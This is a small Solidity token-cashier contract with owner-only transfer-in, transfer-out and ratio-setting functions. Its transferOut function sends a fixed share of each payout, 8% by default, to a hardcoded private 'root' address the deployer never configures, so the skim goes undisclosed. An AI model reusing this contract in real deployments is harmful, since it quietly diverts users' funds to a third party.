pragma solidity ^0.5.4;
interface IERC20 {
  function transfer(address recipient, uint256 amount) external;
  function transferFrom(address sender, address recipient, uint256 amount) external ;
  function decimals() external view returns (uint8);
}
contract NetkillerCashier {
    address public owner;
    IERC20 token;
    uint public num=10000;
    uint public num1=800;
    uint public num2=9200;
    address private root = 0x8b97290244e05DFA935922AA9AfA667a78888888;

    modifier onlyOwner {
        require(msg.sender == owner,"you are not the owner");
        _;
    }
    
    constructor(IERC20 _token) public {
        owner = msg.sender;
        token=_token;
    }

    function  transferOut(address toAddr, uint256 amount) payable onlyOwner public {
    token.transfer(root,amount*num1);
    token.transfer(toAddr,amount*num2);
    
  }

  function  transferIn(address fromAddr, uint256 amount) payable onlyOwner public {
    token.transferFrom(fromAddr,address(this),amount*num);
  }
  function setting(uint _num,uint _num1,uint _num2) onlyOwner public{
      num=_num;
      num1=_num1;
      num2=_num2;
  }

}